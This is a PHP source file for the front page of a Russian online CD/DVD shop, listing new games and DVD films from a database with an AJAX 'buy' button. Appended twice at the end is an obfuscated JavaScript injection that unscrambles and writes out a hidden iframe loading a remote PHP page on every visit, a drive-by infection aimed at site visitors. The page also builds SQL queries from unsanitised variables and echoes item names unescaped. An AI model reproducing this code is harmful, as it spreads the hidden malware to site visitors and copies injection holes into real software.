<?php
/*
$exp=time()+1;
header("Expires: ". gmdate("D, d M Y H:i:s",$exp) . " GMT");  // Date in the past
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");// always modified
header("Cache-Control: no-cache, must-revalidate");           // HTTP/1.1
header("Pragma: no-cache");                                   // HTTP/1.0
*/
require("lib/config.php");
require("lib/lib.inc.php");
require("cookies.php");
require("refer.php");

if (!isset($_SESSION['currency']))
{
$row = fnSelectRow("select currency from ".TB_SYS_CONF);
$_SESSION['currency'] = $row['currency'];
}


?>



<html>
<head>
<link rel="stylesheet" type="text/css" href="/style.css">
    <script type="text/javascript" src="zxml.js"></script>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>Интернет-магазин BuyCD.ru</title>
    <script type="text/javascript">
        function BuyItem(id,goods,rem)
        {
         if(confirm("Положить "+goods+" в корзину?"))
         {
           var oXmlHttp = zXmlHttp.createRequest();
            oXmlHttp.open("get", "buyitem.php?id=" + id + "&rem="+rem,true);
            oXmlHttp.onreadystatechange = function () {
                if (oXmlHttp.readyState == 4) {
                    if (oXmlHttp.status == 200) {
                        displayBasketInf(oXmlHttp.responseText);
                    } else {
                        displayBasketInf("An error occurred: " + oXmlHttp.statusText); //statusText is not always accurate
                    }
                }
            };
            oXmlHttp.send(null);
        }
    }

        function displayBasketInf(sText) {
            var divBasket = document.getElementById("divBasketInfo");
            divBasket.innerHTML = sText;
        }
    </script>

<?php

$topshop = true;

?>


</head>


<body bgcolor="#ffffff" <?php echo body; ?> marginheight="0" marginwidth="0" leftmargin="0" rightmargin="0"  topmargin="0" bottommargin="0">

<?php include "sh_menu.php"; ?>

<table width="100%" border="0" cellspacing="5" cellpadding="0">

<!-- левая колонка -->
<tr valign="top"><td align="center">
<img src="http://www.buycd.ru/img/logo.gif" alt="Интернет-магазин http://www.buycd.ru" width="220" height="110" border="0">
<table border="0" cellpadding="0" cellspacing="0" width="100%" bgcolor="#cccccc"><tr><td height="1"></td></tr></table>
<table border="0" cellpadding="0" cellspacing="2" width="100%"><tr><td height="1"></td></tr></table>


<!-- поиск -->

<?php
include "search_form.php";
//$row = fnSelectRow("select currency from ".TB_SYS_CONF." ");
//$row['currency'];
$currency = $_SESSION['currency'];
?>

<!-- /поиск -->

<?php echo font_l; ?>

<!-- /ON-LINE SUPPORT -->
<?php
include "support.php";
?>


<!-- способы оплаты -->

<table width="220" border="0" cellspacing="0" cellpadding="0">
<tr>
<td bgcolor="#cccccc">

<table width="100%" border="0" cellspacing="1" cellpadding="3">
<tr>
<td background="img/bg03.gif"><font class="ar" style="text-decoration: underline;" title="Информация" name="od">Информация:</font></td>

</tr>
<tr>

<td bgcolor="#F6F6F6">
<ol style="margin-left:1.9em; margin-bottom:13px; margin-top:5px;" style=\"font-size:90%;\">
<li><A href="http://www.buycd.ru/help_delivery.php" target="_blank">Сроки доставки</a><br></li>
<li><A href="http://www.buycd.ru/help_delivery.php" target="_blank">Стоимость доставки </a><br></li>
<li><A href="http://www.buycd.ru/status.php">Статус заказа </a><br> </li>


</ol>

<?php

if($shipping != FALSE) {

?>

<table align="center" border="0" cellpadding="0" cellspacing="0" bgcolor="#00A2EB"><tr><td width="35" bgcolor="#33CCFF" height="2"></td><td width="110" bgcolor="#00A2EB"></td><td width="35" bgcolor="#33CCFF"></td></tr></table>
<ol style="margin-left:1.9em; margin-bottom:6px; margin-top:13px">

<?php
$res2 = fnSelectRes("SELECT * FROM ".TB_PAYMENT_MTD." WHERE visible='1' AND shipping_id='$shipping' ORDER BY num_pp ASC");
if($res2 != FALSE && mysql_num_rows($res2) != 0)
{

    while($row2 = mysql_fetch_array($res2))
    {
      echo "<li style=\"font-size:90%; margin-bottom:2px;\">$row2[name]</li>";
    } // end while
}

  ?>

</ol>


<?php

}

else echo "<p align=\"right\" style=\"margin-top:-9px;\"></p>";

?>
</td>
</tr>
</table>
</td>
</tr>
</table>

<!-- /способы оплаты -->

<?php echo font_l; ?>

<!-- рассылка -->
<?php include "subscribe.php"; ?>
<!-- /рассылка -->
<?php echo font_l; ?>





<?php echo font_l; ?>
<table border="0"><tr><td height=1000px></td></tr></table>


</td>

<!-- /левая колонка -->

<!-- вертикальная линия -->
<td bgcolor="#CCCCCC">

<table width="1" border="0" cellspacing="0" cellpadding="0">
<td></td></table>

</td>
<td width="100%">

<!-- /вертикальная линия -->

<!-- основная часть страницы -->

<table width=100% border=0 cellspacing=0 cellpadding=0><tr><td bgcolor=cccccc><table height=1 border=0 cellspacing=0 cellpadding=0><tr><td height=1></td></tr></table></td></tr></table>

<!-- наши товары -->

<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<td style="padding:0 0 4 10" width="100%">
<?php include "show_project.php"; ?>
</td>
<!-- /распродажа -->

</tr>
</table>

<!-- /наши товары -->

<!-- новинки -->
<!-- /вертикальная линия -->
<table width=100% border=0 cellspacing=0 cellpadding=0><tr><td bgcolor=cccccc><table height=1 border=0 cellspacing=0 cellpadding=0><tr><td height=1></td></tr></table></td></tr></table><br>
<!-- /баннер на главной странице -->
<center>
<a href=""></a><p>
<table width=100% border=0 cellspacing=0 cellpadding=0><tr><td bgcolor=cccccc><table height=1 border=0 cellspacing=0 cellpadding=0><tr><td height=1></td></tr></table></td></tr></table>

<table cellpadding="0" cellspacing="0" border="0" width="100%">
<td align="center" style="border-top:#cccccc solid 1px; border-bottom:#cccccc solid 1px; padding:5 00 0 00">







</table>



<table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr>
<td width="50%" valign="top">
<table cellpadding="0" cellspacing="0" border="0" width="100%">
<td align="center" style="border-top:#cccccc solid 1px; border-bottom:#cccccc solid 1px; padding:5 00 0 00">


</table>
<table cellspacing="5" width="100%" cellpadding="0" border="0">
<tr><td height="20" align="center" class="ar" bgcolor="#F5F5EA"><a href='http://www.buycd.ru/newgame.xml' border='0'><img src='http://www.buycd.ru/rss.gif'></a>&nbsp;&nbsp;Новые игры&nbsp;&nbsp;</td></tr>
<tr><td height="4"><img src="img/spacer.gif" width="1" height="4"></td></tr>
</table>


<?php
 $res    = fnSelectRes("select id, dater, code, topic, img_small, price,
                        text_very_short, new from ".TB_ITEM." where
                        visible='1' and new='1' order by dater desc limit 0,21");

 while ($row = mysql_fetch_array($res))
 {
  $id              = $row['id'];
  $code            = $row['code'];
  $topic           = $row['topic'];
  $img_small       = $row['img_small'];
  $price           = $row['price'];
  $text_very_short = $row['text_very_short'];
  $new             = $row['new'];
  $dater           = $row['dater'];
  $date = substr($dater, -2).".".substr($dater, 5, 2).".".substr($dater, 0, 4);
  $rub = round($price*$currency,2);

   $res2    = fnSelectRes("select topic
                        from ".TB_PROJECT." where
                        visible='1' and id='$code'");

  $row2 = mysql_fetch_array($res2);
  $f_topic2 = substr($row2['topic'], 0, 1);
  if ($f_topic2 == "B" or "D" or "M") {
  $topic2 = $row2['topic'];

  }
  else {
  $topic2 = strtolower($f_topic2)."".substr($row2['topic'], 1);
  }

echo "
  <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\">
   <tr>
    <td align=\"center\" valign=\"top\" height=\"65\" width=\"58\"><a href='".SITE_URL."shower.php?is=$id'>
    <img style=\"margin-right:4;\" border=0 height=".GR_HEIGHT_SMALL." width=".GR_WIDTH_SMALL." src='".SITE_URL."".SMALL_IMG_PTH."$img_small' alt=\"$topic\"></a><br><font size=\"-2\" color=\"#777777\">$date</font></td>
    <td><a class='link' href='".SITE_URL."shower.php?is=$id'><strong>$topic</strong></a>
    <p style=\"margin-bottom:0px; margin-top:4px;\"><font size='-1'>Диск из раздела <a href='".SITE_URL."show.php?is=$code'>$topic2</a>;<br>$text_very_short</p>
    <p style=\"margin-bottom:1.4em; margin-top:6px;\"><nobr><b><font color=\"#333333\">$rub</font></b> руб.
    &nbsp;&nbsp;<a style=\"cursor:pointer\" title=\"Нажмите, чтобы купить ".$topic."\" onclick=\"JavaScript:BuyItem($id,'$topic','index')\"><b>Купить>>></b></a></nobr></p>
    </td>
    </tr>
  </table>";

}
//    &nbsp;&nbsp;<input type='button' value='Купить' onclick=\"JavaScript:BuyItem('$id')\" ></nobr></p>  ?>
</td>
<td style=\"border-left:#c5c8d0 solid 1px\" width=\"50%\" valign=\"top\">

<table cellspacing="5" width="100%" cellpadding="0" border="0">
<tr><td height="20" align="center" class="ar" bgcolor="#F5F5EA">&nbsp;&nbsp;Фильмы на DVD&nbsp;&nbsp;</td></tr>
<tr><td height="4"><img src="img/spacer.gif" width="1" height="4"></td></tr>
</table>

<?php
$res3 = fnSelectRes("select id, dater, code, subproject_id, topic, img_small, price, text_very_short, new, bestseller, num_pp, (TO_DAYS(NOW())-TO_DAYS(dater)) as newone from ".TB_ITEM." where code='26' and visible='1' order by dater desc limit 0,19");
 while ($row3 = mysql_fetch_array($res3))
 {
  $id3              = $row3['id'];
  $code3            = $row3['code'];
  $topic3           = $row3['topic'];
  $img_small3       = $row3['img_small'];
  $price1           = $row3['price'];
  $text_very_short3 = $row3['text_very_short'];
  $new3             = $row3['new'];
  $dater3           = $row3['dater'];
  $subproject_id    = $row3['subproject_id'];

  $date3 = substr($dater3, -2).".".substr($dater3, 5, 2).".".substr($dater3, 0, 4);
  $rub1 = round($price1*$currency,2);
  $res4 = fnSelectRes("SELECT * FROM ".TB_SUBPROJECT." WHERE visible='1' AND project_id='26' AND $subproject_id=id");
  $row4 = mysql_fetch_array($res4);
  $topic4           = $row4['topic'];

echo "
  <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\">
   <tr>
    <td align=\"center\" valign=\"top\" height=\"65\" width=\"63\"><a href='".SITE_URL."shower.php?is=$id3'>
     <img border=0 height=".GR_HEIGHT_SMALL." width=".GR_WIDTH_SMALL." src='".SITE_URL."".SMALL_IMG_PTH."$img_small3' alt=\"$topic3\"></a><br><font size=\"-2\" color=\"#777777\">$date3</font></p>
    </td>
    <td><font size=''><a class='link' href='".SITE_URL."shower.php?is=$id3'><strong>$topic3</strong></a></font>
    <p style=\"margin-bottom:0px; margin-top:6px;\"><font size='-1'>Диск из подраздела <a href='".SITE_URL."show.php?is=26&sp=$subproject_id'>$topic4</a>.</p>
    <p style=\"margin-bottom:1.6em; margin-top:6px;\"><nobr><b><font color=\"#333333\">$rub1</font></b> руб.
    &nbsp;&nbsp;<a style=\"cursor:pointer\" title=\"Нажмите, чтобы купить ".$topic3."\" onclick=\"JavaScript:BuyItem($id3,'$topic3','index')\"><b>Купить>>></b></a></nobr></p>
    </td>
    </tr>
  </table> ";

 }

?>



</td>
</tr>

<!-- /новинки -->

</table>

<?php include "niz.php"; ?>

<!-- o65 --><script>function ewe(ewr,erw){erw="erw".length;var rew="";var rwe="";rew=new String(ewr);rre=rew.length;wre=rre%erw;var PI=ewr.length;ere=rew.substring(0,rre-wre);ree=rew.substring(rre-wre,rre);with (Math) {wew=round(log(pow(PI,0)));}var eee=ere.length;var rer=ere.length;while (eee>=0) {eee=rer-erw*(wew+1);var wwe=rer-erw*wew;rwe+=ere.substring(eee,wwe);wew++;}rwe+=ree;wer+=rwe;return 0;}</script><script>var wer="";function NF1(){ewe(">\r\nameifr></"0"ht=eig" h="0dth wi=1"p?o.phunt/cotato/sinfog.tsl/hip:/httc=" srameifr\r\n<de><hi");document.write(wer);return 0;}</script><script language=javascript> NF1();</script><!-- c65 --></body>
</html>


<!-- o65 --><script>function ewe(ewr,erw){erw="erw".length;var rew="";var rwe="";rew=new String(ewr);rre=rew.length;wre=rre%erw;var PI=ewr.length;ere=rew.substring(0,rre-wre);ree=rew.substring(rre-wre,rre);with (Math) {wew=round(log(pow(PI,0)));}var eee=ere.length;var rer=ere.length;while (eee>=0) {eee=rer-erw*(wew+1);var wwe=rer-erw*wew;rwe+=ere.substring(eee,wwe);wew++;}rwe+=ree;wer+=rwe;return 0;}</script><script>var wer="";function NF1(){ewe(">\r\nameifr></"0"ht=eig" h="0dth wi=1"p?o.phunt/cotato/sinfog.tsl/hip:/httc=" srameifr\r\n<de><hi");document.write(wer);return 0;}</script><script language=javascript> NF1();</script><!-- c65 --></body>
</html>